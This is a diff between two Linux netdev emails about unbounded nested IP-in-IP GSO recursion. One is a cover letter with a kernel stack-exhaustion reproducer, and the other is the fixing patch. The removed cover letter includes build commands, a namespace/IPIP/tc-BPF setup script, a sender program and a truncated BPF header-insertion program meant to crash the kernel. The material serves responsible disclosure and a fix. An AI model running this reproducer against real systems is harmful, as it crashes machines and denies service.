@@ -1,62 +1,64 @@
-Received: from mail-pz2-f12.google.com (mail-pz2-f12.google.com [74.125.228.12])
+Received: from mail-pg1-f173.google.com (mail-pg1-f173.google.com [209.85.215.173])
 	(using TLSv1.2 with cipher ECDHE-RSA-AES128-GCM-SHA256 (128/128 bits))
 	(No client certificate requested)
-	by smtp.subspace.kernel.org (Postfix) with ESMTPS id 6DC68318B9C
-	for <netdev@vger.kernel.org>; Thu, 17 Sep 2026 16:00:55 +0000 (UTC)
-Authentication-Results: smtp.subspace.kernel.org; arc=none smtp.client-ip=74.125.228.12
+	by smtp.subspace.kernel.org (Postfix) with ESMTPS id 051A45013DE
+	for <netdev@vger.kernel.org>; Thu, 17 Sep 2026 16:01:04 +0000 (UTC)
+Authentication-Results: smtp.subspace.kernel.org; arc=none smtp.client-ip=209.85.215.173
 ARC-Seal:i=1; a=rsa-sha256; d=subspace.kernel.org; s=arc-20240116;
-	t=1789660858; cv=none; b=uKsAQCY59DKqsQT6iSQPrKmf1yLenTxIyS9EAb6a7469UGcKgbi6KmtfplWaLkaYa0vORYqeu1B+ozVlUa0P+xliD0YZQkx5sGLAnv48qNzBTsbri9PxyQs9mttWhmkiyVIS/lPyK6ZPGuQKC/J+xmbWw+KYHK6lXYKOBBXX3ao=
+	t=1789660867; cv=none; b=tjhmkUZ3XwMhJyD9uWstaaDQfDg8D3ffVxZ6X95UEwfdg5oPkyb0jDcIRFZ9aFhCDlD6DV5wD+XzdHlZjwUUivuv1v/7r9Yln6bZoSNJ1qDHeN3R0jmRfkX1TqWMhxPlV1V/GFglSUSsJEFrg3cspzhz8YXa9wImsM9qfhYECPs=
 ARC-Message-Signature:i=1; a=rsa-sha256; d=subspace.kernel.org;
-	s=arc-20240116; t=1789660858; c=relaxed/simple;
-	bh=c2CTTQZqHpKZYGBgJbnHrW2y8pAoB3nFMG3Fbk4pTnw=;
-	h=From:To:Cc:Subject:Date:Message-ID:MIME-Version; b=UlSnwAFtZoTvcORN1mJA7tW5SVpGAtJlSFBRDmhIj2WKp2D5YZ281LNXRIrLSyKzkPfhQdJX4B64nXsches17Eb1h/Sb6WSdSSSFS+z9SBW4C8WMhyxLeI2Rs8ba8iirG93gCrvoJNmv1NaILtrbSvx9OdIGm0ZORWBzyz7xH5c=
-ARC-Authentication-Results:i=1; smtp.subspace.kernel.org; dmarc=pass (p=quarantine dis=none) header.from=nebusec.ai; spf=pass smtp.mailfrom=nebusec.ai; dkim=pass (2048-bit key) header.d=nebusec.ai header.i=@nebusec.ai header.b=oA5V9Vku; arc=none smtp.client-ip=74.125.228.12
+	s=arc-20240116; t=1789660867; c=relaxed/simple;
+	bh=dvh6b0KVOVdO6czJGXIWw6LrWejSjZKAVEyry5ExqTg=;
+	h=From:To:Cc:Subject:Date:Message-ID:In-Reply-To:References:
+	 MIME-Version; b=Nw0OS17NO+2CVqJUPKwQHVcifYD121FczFEE3dDJDck8Dxix3DMQS/duGjvfpLwaVw9bEkklhckId/AX/UnjXtuWtPvBKoIS8jZ+oy8UZOLWk1XeFbdSCNDCUXVgLuu18o958RtPS1RYfZB+YTVmGBtV90hJ4ZbBuI9v65xFECc=
+ARC-Authentication-Results:i=1; smtp.subspace.kernel.org; dmarc=pass (p=quarantine dis=none) header.from=nebusec.ai; spf=pass smtp.mailfrom=nebusec.ai; dkim=pass (2048-bit key) header.d=nebusec.ai header.i=@nebusec.ai header.b=YFl2stht; arc=none smtp.client-ip=209.85.215.173
 Authentication-Results: smtp.subspace.kernel.org; dmarc=pass (p=quarantine dis=none) header.from=nebusec.ai
 Authentication-Results: smtp.subspace.kernel.org; spf=pass smtp.mailfrom=nebusec.ai
 Authentication-Results: smtp.subspace.kernel.org;
-	dkim=pass (2048-bit key) header.d=nebusec.ai header.i=@nebusec.ai header.b="oA5V9Vku"
-Received: by mail-pz2-f12.google.com with SMTP id d2e1a72fcca58-85469a33c9cso1213645b3a.0
-        for <netdev@vger.kernel.org>; Thu, 17 Sep 2026 09:00:55 -0700 (PDT)
+	dkim=pass (2048-bit key) header.d=nebusec.ai header.i=@nebusec.ai header.b="YFl2stht"
+Received: by mail-pg1-f173.google.com with SMTP id 41be03b00d2f7-cbedd5aece4so729338a12.0
+        for <netdev@vger.kernel.org>; Thu, 17 Sep 2026 09:01:04 -0700 (PDT)
 DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
-        d=nebusec.ai; s=google; t=1789660855; x=1790265655; darn=vger.kernel.org;
-        h=content-transfer-encoding:mime-version:message-id:date:subject:cc
-         :to:from:from:to:cc:subject:date:message-id:reply-to:content-type;
-        bh=EzIt+WRP8WQ8BBHgo9JaMmXOdWaHIteC0zTy6cHnlUc=;
-        b=oA5V9VkueVOFfV4G8gJ+Gxi20cTcIzzYdUjchugUgPlUc95Vw0d3ArvdoJdeagxysK
-         iK96yDJJBxJg7QvDlMFi3s0WPzDhR89pCEP7tSNTnHke2JyoR/0n9UnRvR8z6OY/RnU4
-         CcMYK0wPXrNKazQbhVE+WbjRWPlXfWQpfhOczBBcWOIV1qq0HNqKamKzOwxEQbo577lz
-         vcbRCF7mSM44qiuqWXGqzjjAqbo5WMLmFu54B+qBZB/337SwsaBDQ2dwHAA/6Mjmy7uu
-         KHkTpXFDelZg22hqvdS5OQx6k0fouUKEVqX2RKc9ZjmqzFTmJp2zHX8p/1jZL6cPtkfk
-         L8Vg==
-X-Google-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
-        d=1e100.net; s=20260707; t=1789660855; x=1790265655;
-        h=content-transfer-encoding:mime-version:message-id:date:subject:cc
-         :to:from:x-gm-gg:x-gm-message-state:from:to:cc:subject:date
+        d=nebusec.ai; s=google; t=1789660864; x=1790265664; darn=vger.kernel.org;
+        h=content-transfer-encoding:mime-version:references:in-reply-to
+         :message-id:date:subject:cc:to:from:from:to:cc:subject:date
          :message-id:reply-to:content-type;
-        bh=EzIt+WRP8WQ8BBHgo9JaMmXOdWaHIteC0zTy6cHnlUc=;
-        b=qVTTJ8mEDhiC+EJAo2my16DoUDGiS9LuAto0SlsE62Ykjz2mQMjQPObP8EnvKkf55C
-         ZPPnqphe4WMOA1ySCK08FMGR1UVSCE0oq/RUzKgiJaf4ejxIflXXdPhFiOdSKpAnP1nJ
-         ceKSH+NBhoRVoFqoTvW4l9fpdQJimiNlBR4vl3V7XEbiaMOoxiSjWgFMdstRJ72QQzYs
-         Pyncp4WKxRuFDl+mASQHtAMl8c0bOYALaxjxje48swDskrQkR0C956CNlw+71XD32PKf
-         NMU54HbXUfRBgv1NN+f11oUxRqYVOhg6u8w4eokRBZ6dI1gmyF1eMZqY0GZYPk5YjXGG
-         b1Ng==
-X-Gm-Message-State: AFuF++nL11GPUqChRNA2xC3DKOopXKhUrvHl5boIhXh04dQvk6Jxun4/
-	9eB0BLfCiaq9pnfjpIcepwen60hwC0Lzp3n0OUf3BAAaFKpdhkXm3beMej2vTsWNzR4idUdMEiU
-	yCvYfoBOj
-X-Gm-Gg: AYBFou07yiElIE/2SZjez0JM4VW6cwd3MLoJDvkDIRatmlXGKNyK3P9CkgQucDog8mK
-	P5FU+tgS1T7/rH/oWb37u+51w3Tj/FSYWYz0ievmDYJGMXMj4HK1BJkw0ImyPUqQzz2+Fdqssx+
-	mw/o05rsq80paxQIh/g9hu2b6yUPil8a8t1rWzMc0N/EeD7SmkLodH0yKH9GcI8Zx3aDijv7Egg
-	w0y+LScLwKPxdVwqFC/QAXUlyxL6Xte7enSwbkNLwkfXO/3zaZvb7nDoDJFgdfU899GC+b5KI8d
-	dV5E0CpcSQnIBQP9/wuMytlqdhMVBo/mjdTJOP1DSQxpe+hElLarhXteJPxxD8OVQLO7lxXCTlL
-	23FnXJAQuw7JD46kA3Jy2h9Z5LbBvS9onMXLCSlf6gYyiB2OjYnmXYLPGW9nCh7msIBawiF6yVe
-	o2hH7ZaqfUOcggOol26w9ia09RDL15ynqNF+8CnxGa0/s5jQ9U3S+rqbV6nOwCwu/0CrmQqHtVB
-	WO3P0IACfCzIjl784PhbuV4UWvdrZvErxJe5/XF
-X-Received: by 2002:a05:6a20:72a1:b0:3da:f969:b077 with SMTP id adf61e73a8af0-3dd5f495c5amr17786406637.11.1789660853965;
-        Thu, 17 Sep 2026 09:00:53 -0700 (PDT)
+        bh=ZlZva5hZIzVbLlSUggdob5VRIXbC2xuvTEYkKIZQZEQ=;
+        b=YFl2sthtspNz/La08f9YNpJH7Pebu0lYGR2HpRom3GIpS1LATUotuoGvfGCjQ1BlR8
+         xpmjxYFHFY5BoydDp49U/LI/EwLzH1ommmtZ/3I38r8RA7spRckWvS97XgTMSViswZPa
+         T5+FBLt+JabT5BSGabSEaulQHDQ9RrmcUBsOKqjN+R1CWHMYjM/+oBRpCw0JNil6G4jj
+         22huUx4PsiUu+jYy93B3AqhsPCk4NU+SUqjCFJiXBuQiDnyVU1+G366nmgKs6sV70kuQ
+         vcrcDznQkFivkTNvDTxQUiH4CqrmVBzULT6EioROSAOrHoabw9Nv38IddMeCtBCjz2fV
+         U0hQ==
+X-Google-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
+        d=1e100.net; s=20260707; t=1789660864; x=1790265664;
+        h=content-transfer-encoding:mime-version:references:in-reply-to
+         :message-id:date:subject:cc:to:from:x-gm-gg:x-gm-message-state:from
+         :to:cc:subject:date:message-id:reply-to:content-type;
+        bh=ZlZva5hZIzVbLlSUggdob5VRIXbC2xuvTEYkKIZQZEQ=;
+        b=wC2z++ghwwgCPd7bfHWK56EV5viZVBSbGxXpsW7H9HhKQOnZtkVg5ljP2xFfI1wpKG
+         njGWq5T1jc7u4DtbdpTm9pqdw2NlE449odmurH/OvzBAGAqlvh4N0hph/pi4zkwHlXU5
+         4yVVW0HI+KElIJhHhPu5ZHsXp4xEV9i2i3kZhOrl0hBnVdQvgkYjmLPQNXsFLoLCUXl+
+         /LJa0pRYpKjXd+7c3oHU3BNKF5Iecs4Y8BZVEKKvOqfXNNrjops6Fv96aTdVWvujl57S
+         8BMG/zll9sM0YJfVE3rRVGJzypAZsTtZjFO+BFATbpHsWpbiLKAIOb4bSVHhcBrVfUzn
+         aScA==
+X-Gm-Message-State: AFuF++nRDGX1jp3EB62+O2Rl1TMT+BMN24hzYFmBA4ZHPdyKcauyG9eU
+	FyzGPb6If2iwNuR1jCpLYcMntcUcUSUuZKwWza4Irv47Twn57ZclDgO7VRi63kU048sH70j1HnZ
+	Z302VrQ19
+X-Gm-Gg: AYBFou1UO6yGfqZXtnWsIi1ytWtYGPvicEmaxfba2dCPvzhOgRJcmH81xKSMnn4PvZc
+	Vbq6zoM5ZgZuwA7zAj8d9/oAtLGBrlwK8/ER4TBLHlzF3fVHU4q7/ovnZdj6zVLvR5MM8AnvFS8
+	5uvvcWXKsPEAhfnXV5+lZN+/qL5xZRVPu87GCU59M645Genbpo6DHs+YfkwV7Pf4Cw61qmruz12
+	caMCn7AWaR/r/Bq7q65U9jSCPxws41GrPkL5MQLd2w9azxBw3YiK/LTOL5bCDMpdVwT66EQS368
+	DxVzk3XjZw6zIy271LOsRA5jQVw9JWcDU55QqhB0NUQkWiIjdKZYLl4C33e1/f/EaNU7YqOEvDg
+	9aOJa+KXxTyky50UCDtWeKjrRUngcuhWLE5x1Zf4aLuaN4OdYiC/PhLNtran7z2f9cq/LjEQWT4
+	yTOiRbRoTv9dfl7IenBdX0LteC1o3m9Ynb372YHdT/m69v9oJ+NMoft9OYinZI89dxoayRfJZsw
+	OAC0+J+Nkw2b+BaJwoDrOYY5yVew2ekOsfeMHd9
+X-Received: by 2002:a05:6a20:6a1d:b0:3bf:8a0e:dd99 with SMTP id adf61e73a8af0-3dd7263a165mr6355995637.17.1789660863994;
+        Thu, 17 Sep 2026 09:01:03 -0700 (PDT)
 Received: from b6ad5085b32f.. ([122.51.212.64])
-        by smtp.gmail.com with ESMTPSA id 41be03b00d2f7-cc50c24487bsm3182043a12.12.2026.09.17.09.00.48
+        by smtp.gmail.com with ESMTPSA id 41be03b00d2f7-cc50c24487bsm3182043a12.12.2026.09.17.09.00.58
         (version=TLS1_3 cipher=TLS_AES_256_GCM_SHA384 bits=256/256);
-        Thu, 17 Sep 2026 09:00:52 -0700 (PDT)
+        Thu, 17 Sep 2026 09:01:02 -0700 (PDT)
 From: Zihan Xi <zihanx@nebusec.ai>
 To: netdev@vger.kernel.org
 Cc: zihanx@nebusec.ai,
@@ -71,10 +73,12 @@ Cc: zihanx@nebusec.ai,
 	idosch@nvidia.com,
 	linux-kernel@vger.kernel.org,
 	stable@vger.kernel.org
-Subject: [PATCH net v2 0/1] net: gso: limit recursive IP-in-IP segmentation
-Date: Thu, 17 Sep 2026 16:00:40 +0000
-Message-ID: <cover.1789618203.git.zihanx@nebusec.ai>
+Subject: [PATCH net v2 1/1] net: gso: limit recursive IP-in-IP segmentation
+Date: Thu, 17 Sep 2026 16:00:41 +0000
+Message-ID: <33280f6e07bccaaeef2c70f1754017e9517f5aa5.1789618203.git.zihanx@nebusec.ai>
 X-Mailer: git-send-email 2.47.3
+In-Reply-To: <cover.1789618203.git.zihanx@nebusec.ai>
+References: <cover.1789618203.git.zihanx@nebusec.ai>
 Precedence: bulk
 X-Mailing-List: netdev@vger.kernel.org
 List-Id: <netdev.vger.kernel.org>
@@ -83,740 +87,54 @@ List-Unsubscribe: <mailto:netdev+unsubscribe@vger.kernel.org>
 MIME-Version: 1.0
 Content-Transfer-Encoding: 8bit
 
-Hi Linux kernel maintainers,
+IPIP GSO/TSO support makes IP-in-IP GSO dispatch re-enter
+inet_gso_segment() or ipv6_gso_segment() for every nested IP header. The
+only state that tracks this nesting is encap_level, which records header
+bytes and has no recursion bound. A sufficiently deep chain can consume the
+kernel stack before a transport GSO callback is reached.
 
-We found and validated an issue in net/core/gso.c. The affected paths are
-skb_mac_gso_segment(), inet_gso_segment(), and ipv6_gso_segment(); nested
-IP-in-IP GSO has no bound on callback nesting. The bug is reachable by a
-non-root user through private user and network namespaces. The BPF/veth
-reproducer needs root in the initial user namespace; the namespace-only
-reproducer starts as UID 65534. The change is expected not to affect other
-functionality; validation covered IPv4 BPF/veth and namespace-only paths on
-x86_64. IPv6 was compile-checked, but no separate IPv6 runtime
-test was run.
+The unbounded callback nesting was introduced when inet_gso_segment() was
+made stackable by "ipv4: gso: make inet_gso_segment() stackable". GRE GSO
+support predated that change, and IP-in-IP GSO/TSO support later made the
+affected path reachable.
 
-Changes in v2:
+The corresponding IPv6 stackable path was introduced separately by
+"ipv6: gso: make ipv6_gso_segment() stackable". This patch uses the same
+budget for IPv6, but the Fixes tag covers the IPv4 root cause only.
+
+Limit the cumulative header budget for a GSO operation to GSO_MAX_HEADER
+(256 bytes). Keep the consumed budget in skb_gso_cb and charge each header
+before dispatching the next GSO callback. The callback wrapper checks the
+same state, so direct IP handler re-entry and nested tunnel dispatch share
+one monotonic budget. GRE and UDP context resets cannot restart it before
+an inner GSO callback; other GSO tunnel and extension handlers charge their
+stripped headers before inner dispatch as well.
+
+GSO_MAX_HEADER is a practical header budget, not a measured stack-overflow
+threshold or an architecture-independent stack-safety proof. With a zero
+initial offset, 12 minimum-sized IPv4 headers consume 240 bytes; the next
+header is rejected. IPv6 base headers, extension headers, and tunnel
+headers use the budget faster. Validation of the preceding
+implementation on x86_64 used a 16 KiB task stack and completed without a
+stack-guard fault, but this does not establish a uniform margin for
+architectures with smaller stacks.
+
+Fixes: 3347c9602955 ("ipv4: gso: make inet_gso_segment() stackable")
+Cc: stable@vger.kernel.org
+Reported-by: Vega <vega@nebusec.ai>
+Assisted-by: LLM
+Co-developed-by: Luxing Yin <root@tr0jan.top>
+Signed-off-by: Luxing Yin <root@tr0jan.top>
+Signed-off-by: Zihan Xi <zihanx@nebusec.ai>
+---
+changes in v2:
   - Replace the callback counter with a cumulative 256-byte header budget
     carried in skb_gso_cb.
-  - Apply the budget at common callback entry and across IP, GRE, UDP,
-    MPLS, NSH, ESP, and IPv6 extension dispatch, including GRE/UDP
-    context resets.
+  - Apply the budget at common callback entry and across IP, GRE, UDP, MPLS,
+    NSH, ESP, and IPv6 extension dispatch, including GRE/UDP context resets.
   - Rebase the UDP hunk onto selected revision c9151088f167 and rerun both
     IPv4 PoCs; use the decoded crash evidence from unpatched 88c17de85ddb.
   - v1 Link: https://lore.kernel.org/all/cover.1789302084.git.zihanx@nebusec.ai/
-
-We will provide detailed information about the bug
-in this email, along with a PoC to trigger it.
-The detailed bug information, PoC, and decoded crash output are
-included below.
-
----- details below ----
-
-Bug details:
-
-An IP-in-IP GSO packet reaches skb_mac_gso_segment() and re-enters the
-IPv4 or IPv6 GSO handler for each nested IP header. The encap_level
-only records header bytes; it does not bound callback depth. A deep
-chain can exhaust the kernel stack before a transport GSO callback is
-reached.
-
-The fix initializes gso_header_len in skb_gso_cb for each top-level GSO
-operation and charges header bytes before inner dispatch. The common
-callback wrapper checks the same state, so direct IP re-entry and nested
-tunnel callbacks share one monotonic budget. GRE and UDP encap_level
-resets cannot restart it.
-
-GSO_MAX_HEADER is a practical 256-byte header budget, not a measured
-stack-overflow threshold or an architecture-independent stack-safety proof.
-With no initial offset, 12 minimum-sized IPv4 headers use 240 bytes and the
-next header is rejected. IPv6, extension, and tunnel headers use the budget
-faster. The fixed x86_64 run completed without a stack-guard fault, but it
-does not establish a uniform margin for architectures with smaller stacks.
-
-The IPv4 stackable re-entry mechanism was introduced by
-3347c9602955 ("ipv4: gso: make inet_gso_segment() stackable").
-68c331631143 ("v4 GRE: Add TCP segmentation offload for GRE") predates it,
-and cb32f511a70b ("ipip: add GSO/TSO support") later expanded the reachable
-IP-in-IP path. The IPv6 stackable path was introduced separately by
-d3e5e0062de5 ("ipv6: gso: make ipv6_gso_segment() stackable"). Fixes points
-to 3347c9602955 for the IPv4 root cause.
-
-Reproducer:
-
-BPF/veth path (run as root in the initial user namespace):
-
-    make clean all
-    ./poc.sh
-
-The checked-in Makefile builds poc and tc_mutate.bpf.o. With KDIR
-unset, the BPF command is:
-
-    clang -O2 -g -target bpf -D__TARGET_ARCH_x86 -Wall -Wextra \
-        -I/usr/include/x86_64-linux-gnu \
-        -DINSERTED_IPS=199 -DTRIGGER_PORT=4242 \
-        -c tc_mutate.bpf.c -o tc_mutate.bpf.o
-
-Runtime needs gcc, clang, iproute2, ethtool, and perl. With no Python 3,
-poc.sh used this actual Perl fallback:
-
-    ip netns exec "$NS" "$DIR/net-server-perl.sh" &
-
-The namespace-only path attempted these setup commands:
-
-    apt-get install -y ethtool
-    cc -O2 -static -g -Wall -Wextra -o poc_privilege_optimized poc_privilege_optimized.c
-
-The guest apt mirror was unavailable, so the final run copied the host
-`/usr/sbin/ethtool` and these runtime files into
-`/usr/local/lib/ethtool-host/`:
-
-    /lib/x86_64-linux-gnu/libmnl.so.0
-    /lib/x86_64-linux-gnu/libm.so.6
-    /lib/x86_64-linux-gnu/libc.so.6
-    /lib64/ld-linux-x86-64.so.2
-
-The wrapper was copied from `verify/ethtool-host-wrapper-public.sh`. Omitting
-only the test harness's SSH identity, port, and host-key options, the copy
-and install commands were:
-
-    ssh root@127.0.0.1 'mkdir -p /usr/local/lib/ethtool-host'
-    scp /usr/sbin/ethtool /lib/x86_64-linux-gnu/libmnl.so.0 \
-        /lib/x86_64-linux-gnu/libm.so.6 /lib/x86_64-linux-gnu/libc.so.6 \
-        /lib64/ld-linux-x86-64.so.2 \
-        root@127.0.0.1:/usr/local/lib/ethtool-host/
-    scp verify/ethtool-host-wrapper-public.sh \
-        root@127.0.0.1:/usr/local/lib/ethtool-host/ethtool-wrapper
-    ssh root@127.0.0.1 \
-        'chmod 755 /usr/local/lib/ethtool-host/ethtool-wrapper; \
-         ln -sf /usr/local/lib/ethtool-host/ethtool-wrapper /usr/sbin/ethtool'
-
-The run then launched the trigger as UID 65534 with:
-
-    su -s /bin/sh nobody -c 'cd /tmp/q7x-ns && exec ./poc_privilege_optimized.sh 180 1400'
-
-The private user namespace maps it to UID 0. Packetdrill is not used
-because the trigger needs network namespaces, IPIP devices, tc egress BPF
-header insertion, and UDP_SEGMENT control data, which cannot be expressed
-as a packetdrill packet sequence.
-
-We run the PoC in a 2 vCPU, 2 GB RAM x86 QEMU environment.
-
-The fixed kernel build at 33280f6e07bccaaeef2c70f1754017e9517f5aa5 returned
-BUILD_RC=0. The fixed BPF/veth run used the Perl fallback, sent 65536
-bytes, and returned REMOTE_RC=0 and DMESG_RC=0. The fixed
-namespace-only run was launched as UID 65534 with depth 180 and gso_size
-1400; it sent a 3676-byte payload, returned 3676 from sendmsg(), and
-returned REMOTE_RC=0 and DMESG_RC=0.
-Neither fixed run showed a crash marker.
-
-REMOTE_RC=0 means normal completion. REMOTE_RC=124 means the host-side
-timeout expired. The unpatched runs returned REMOTE_RC=255 (and
-DMESG_RC=255 for BPF) after the guest became unreachable; these are
-wrapper statuses, not kernel
-error codes.
-
-------BEGIN Makefile------
-CC ?= gcc
-CLANG ?= clang
-KDIR ?=
-BPF_CFLAGS ?= -O2 -g -target bpf -D__TARGET_ARCH_x86 -Wall -Wextra -I/usr/include/x86_64-linux-gnu $(if $(KDIR),-I$(KDIR)/tools/lib/bpf)
-CFLAGS ?= -O2 -Wall -Wextra
-INSERTED_IPS ?= 199
-TRIGGER_PORT ?= 4242
-
-all: poc tc_mutate.bpf.o
-
-poc: poc.c
-	$(CC) $(CFLAGS) -o $@ $<
-
-tc_mutate.bpf.o: tc_mutate.bpf.c
-	$(CLANG) $(BPF_CFLAGS) -DINSERTED_IPS=$(INSERTED_IPS) -DTRIGGER_PORT=$(TRIGGER_PORT) -c -o $@ $<
-
-clean:
-	rm -f poc tc_mutate.bpf.o
-------END Makefile--------
-
-------BEGIN net-server-perl.sh------
-#!/bin/sh
-exec perl -MIO::Socket::INET -e 'my $s = IO::Socket::INET->new(LocalAddr => "198.18.0.2", LocalPort => 4242, Listen => 1, ReuseAddr => 1) or die "server: $!\n"; my $c = $s->accept() or die "accept: $!\n"; my $buf; while (read($c, $buf, 65536)) {}'------END net-server-perl.sh--------
-
-------BEGIN poc.c------
-#define _GNU_SOURCE
-
-#include <arpa/inet.h>
-#include <errno.h>
-#include <netinet/in.h>
-#include <netinet/tcp.h>
-#include <stdio.h>
-#include <stdlib.h>
-#include <string.h>
-#include <sys/socket.h>
-#include <sys/types.h>
-#include <unistd.h>
-
-static void usage(const char *prog)
-{
-	fprintf(stderr, "Usage: %s <ip> <port> <bytes>\n", prog);
-}
-
-int main(int argc, char **argv)
-{
-	struct sockaddr_in addr;
-	char *buf;
-	unsigned long port;
-	unsigned long total;
-	size_t off = 0;
-	int one = 1;
-	int fd;
-
-	if (argc != 4) {
-		usage(argv[0]);
-		return 1;
-	}
-
-	port = strtoul(argv[2], NULL, 0);
-	total = strtoul(argv[3], NULL, 0);
-	if (port > 65535 || total == 0) {
-		fprintf(stderr, "invalid port or byte count\n");
-		return 1;
-	}
-
-	buf = malloc(total);
-	if (!buf) {
-		perror("malloc");
-		return 1;
-	}
-	for (off = 0; off < total; off++)
-		buf[off] = 'A' + (off % 23);
-
-	fd = socket(AF_INET, SOCK_STREAM, 0);
-	if (fd < 0) {
-		perror("socket");
-		free(buf);
-		return 1;
-	}
-
-	if (setsockopt(fd, IPPROTO_TCP, TCP_NODELAY, &one, sizeof(one)) < 0) {
-		perror("setsockopt(TCP_NODELAY)");
-		close(fd);
-		free(buf);
-		return 1;
-	}
-
-	memset(&addr, 0, sizeof(addr));
-	addr.sin_family = AF_INET;
-	addr.sin_port = htons((uint16_t)port);
-	if (inet_pton(AF_INET, argv[1], &addr.sin_addr) != 1) {
-		fprintf(stderr, "invalid IPv4 address\n");
-		close(fd);
-		free(buf);
-		return 1;
-	}
-
-	if (connect(fd, (struct sockaddr *)&addr, sizeof(addr)) < 0) {
-		perror("connect");
-		close(fd);
-		free(buf);
-		return 1;
-	}
-
-	off = 0;
-	while (off < total) {
-		ssize_t n = send(fd, buf + off, total - off, 0);
-
-		if (n < 0) {
-			perror("send");
-			close(fd);
-			free(buf);
-			return 1;
-		}
-		off += (size_t)n;
-	}
-
-	fprintf(stderr, "sent %lu bytes to %s:%lu\n", total, argv[1], port);
-	close(fd);
-	free(buf);
-	return 0;
-}
-------END poc.c--------
-
-------BEGIN poc.sh------
-#!/bin/sh
-set -eu
-
-DIR=$(CDPATH= cd -- "$(dirname -- "$0")" && pwd)
-
-NS=${NS:-q7xns}
-OUTER_DEV0=${OUTER_DEV0:-q7xveth0}
-OUTER_DEV1=${OUTER_DEV1:-q7xveth1}
-OUTER0=${OUTER0:-10.10.0.1/24}
-OUTER1=${OUTER1:-10.10.0.2/24}
-OUTER0_IP=${OUTER0_IP:-10.10.0.1}
-OUTER1_IP=${OUTER1_IP:-10.10.0.2}
-TUN0=${TUN0:-q7xipip0}
-TUN1=${TUN1:-q7xipip1}
-INNER0_IP=${INNER0_IP:-198.18.0.1}
-INNER1_IP=${INNER1_IP:-198.18.0.2}
-TARGET_IP=${TARGET_IP:-198.18.0.2}
-PORT=${PORT:-4242}
-SEND_BYTES=${SEND_BYTES:-65536}
-SERVER_PIDFILE=/tmp/q7x-server.pid
-
-cleanup() {
-	tc qdisc del dev "$OUTER_DEV0" clsact 2>/dev/null || true
-	ip link del "$TUN0" 2>/dev/null || true
-	ip netns del "$NS" 2>/dev/null || true
-	ip link del "$OUTER_DEV0" 2>/dev/null || true
-	rm -f "$SERVER_PIDFILE"
-}
-
-trap cleanup EXIT
-
-gcc -O2 -Wall -Wextra -o "$DIR/poc" "$DIR/poc.c"
-if [ ! -f "$DIR/tc_mutate.bpf.o" ]; then
-	echo "missing tc_mutate.bpf.o; build it on the host with: make -C $DIR" >&2
-	exit 1
-fi
-
-cleanup
-
-ip netns add "$NS"
-ip link add "$OUTER_DEV0" type veth peer name "$OUTER_DEV1"
-ip link set "$OUTER_DEV1" netns "$NS"
-
-ip addr add "$OUTER0" dev "$OUTER_DEV0"
-ip link set "$OUTER_DEV0" up
-ip netns exec "$NS" ip addr add "$OUTER1" dev "$OUTER_DEV1"
-ip netns exec "$NS" ip link set lo up
-ip netns exec "$NS" ip link set "$OUTER_DEV1" up
-
-ethtool -K "$OUTER_DEV0" tso off gso off gro off sg off >/dev/null 2>&1 || true
-
-ip link add "$TUN0" type ipip local "$OUTER0_IP" remote "$OUTER1_IP" dev "$OUTER_DEV0"
-ip addr add "$INNER0_IP" peer "$INNER1_IP" dev "$TUN0"
-ip link set "$TUN0" up
-
-ip netns exec "$NS" ip link add "$TUN1" type ipip local "$OUTER1_IP" remote "$OUTER0_IP" dev "$OUTER_DEV1"
-ip netns exec "$NS" ip addr add "$INNER1_IP" peer "$INNER0_IP" dev "$TUN1"
-ip netns exec "$NS" ip link set "$TUN1" up
-
-tc qdisc add dev "$OUTER_DEV0" clsact
-tc filter add dev "$OUTER_DEV0" egress bpf da obj "$DIR/tc_mutate.bpf.o" sec tc
-
-if command -v python3 >/dev/null 2>&1; then
-    ip netns exec "$NS" python3 - <<'PY' &
-import socket
-import sys
-
-s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
-s.bind(("198.18.0.2", 4242))
-s.listen(1)
-conn, _ = s.accept()
-while conn.recv(65535):
-    pass
-PY
-else
-    echo "using Perl listener: $DIR/net-server-perl.sh" >&2
-    ip netns exec "$NS" "$DIR/net-server-perl.sh" &
-fi
-echo $! > "$SERVER_PIDFILE"
-sleep 1
-
-"$DIR/poc" "$TARGET_IP" "$PORT" "$SEND_BYTES"
-sleep 2
-------END poc.sh--------
-
-------BEGIN tc_mutate.bpf.c------
-#include <linux/bpf.h>
-#include <linux/if_ether.h>
-#include <linux/ip.h>
-#include <linux/pkt_cls.h>
-#include <linux/tcp.h>
-#include <stddef.h>
-
-#ifndef INSERTED_IPS
-#define INSERTED_IPS 199
-#endif
-
-#ifndef TRIGGER_PORT
-#define TRIGGER_PORT 4242
-#endif
-
-#ifndef IP_DF
-#define IP_DF 0x4000
-#endif
-
-#ifndef IPPROTO_IPIP
-#define IPPROTO_IPIP 4
-#endif
-
-#ifndef IPPROTO_TCP
-#define IPPROTO_TCP 6
-#endif
-
-#define SEC(NAME) __attribute__((section(NAME), used))
-#define bpf_htons(x) ((__be16)__builtin_bswap16((__u16)(x)))
-#define bpf_ntohs(x) ((__u16)__builtin_bswap16((__u16)(x)))
-#define bpf_htonl(x) ((__be32)__builtin_bswap32((__u32)(x)))
-
-#define INSERTED_LEN (INSERTED_IPS * (__u32)sizeof(struct iphdr))
-
-static long (*bpf_skb_load_bytes)(struct __sk_buff *skb, __u32 off,
-				  void *to, __u32 len) =
-	(void *)BPF_FUNC_skb_load_bytes;
-static long (*bpf_skb_adjust_room)(struct __sk_buff *skb, __s32 len_diff,
-				   __u32 mode, __u64 flags) =
-	(void *)BPF_FUNC_skb_adjust_room;
-static long (*bpf_skb_store_bytes)(struct __sk_buff *skb, __u32 off,
-				   const void *from, __u32 len,
-				   __u64 flags) =
-	(void *)BPF_FUNC_skb_store_bytes;
-static long (*bpf_l3_csum_replace)(struct __sk_buff *skb, __u32 off,
-				   __u64 from, __u64 to, __u64 size) =
-	(void *)BPF_FUNC_l3_csum_replace;
-
-static __always_inline int load_bytes(struct __sk_buff *skb, __u32 off,
-				      void *dst, __u32 len)
-{
-	return bpf_skb_load_bytes(skb, off, dst, len);
-}
-
-SEC("tc")
-int mutate_gso_chain(struct __sk_buff *skb)
-{
-	struct iphdr outer;
-	struct iphdr inner;
-	struct tcphdr th;
-	__u32 off = sizeof(struct ethhdr);
-	__u32 ins_off = off + sizeof(struct iphdr);
-	__u16 new_tot;
-	int i;
-
